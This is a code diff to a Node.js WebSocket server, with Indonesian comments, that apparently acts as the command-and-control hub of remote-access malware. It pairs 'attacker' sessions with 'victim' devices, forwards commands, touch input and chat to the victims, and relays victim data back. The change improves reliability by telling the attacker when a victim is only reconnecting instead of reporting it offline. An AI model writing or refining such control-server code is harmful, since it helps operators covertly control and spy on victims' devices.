@@ -366,7 +366,33 @@ wss.on('connection',ws=>{
     }
     if(ws.role==='attacker'&&msg.type==='add_victim'){const v=victims.get(msg.victimId);if(!v||v.attackerId!==ws.userId)return;v.pending=false;acceptedSessions.set(v.code,{victimId:msg.victimId,attackerId:ws.userId});ws.send(JSON.stringify({type:'victim_added',victimId:msg.victimId,deviceInfo:v.deviceInfo}));v.ws.send(JSON.stringify({type:'connection_accepted'}));return;}
     if(ws.role==='attacker'&&msg.type==='reject_victim'){const v=victims.get(msg.victimId);if(v){v.ws.send(JSON.stringify({type:'connection_rejected'}));victims.delete(msg.victimId);}return;}
-    if(ws.role==='attacker'){const v=victims.get(msg.targetId);if(!v||v.attackerId!==ws.userId||v.ws.readyState!==WebSocket.OPEN){ws.send(JSON.stringify({type:'victim_offline',victimId:msg.targetId}));return;}if(['command','touch','chat'].includes(msg.type))v.ws.send(JSON.stringify(msg));return;}
+    if(ws.role==='attacker'){
+      const tid = msg.targetId;
+      if (!tid) return;
+      const v = victims.get(tid);
+
+      if (!v || v.attackerId !== ws.userId) {
+        // FIX BUG 3: Victim benar-benar tidak ada → baru kirim offline
+        ws.send(JSON.stringify({ type: 'victim_offline', victimId: tid }));
+        return;
+      }
+
+      if (v.ws.readyState !== WebSocket.OPEN) {
+        // FIX BUG 3: Victim ada tapi WS sedang reconnect (grace period)
+        // JANGAN kirim victim_offline — kirim cmd_failed saja
+        ws.send(JSON.stringify({
+          type: 'cmd_failed',
+          victimId: tid,
+          msg: 'Korban sedang reconnecting, coba lagi sebentar'
+        }));
+        return;
+      }
+
+      if (['command', 'touch', 'chat'].includes(msg.type)) {
+        v.ws.send(JSON.stringify(msg));
+      }
+      return;
+    }
     if(ws.role==='victim'){const ac=attackers.get(ws.attackerId);if(!ac||ac.ws.readyState!==WebSocket.OPEN)return;if(msg.type==='chat'&&msg.sender==='victim'){ac.ws.send(JSON.stringify({type:'chat_vic',text:msg.text,sourceId:ws.victimId}));return;}ac.ws.send(JSON.stringify({...msg,sourceId:ws.victimId}));}
   });
   ws.on('close',()=>{
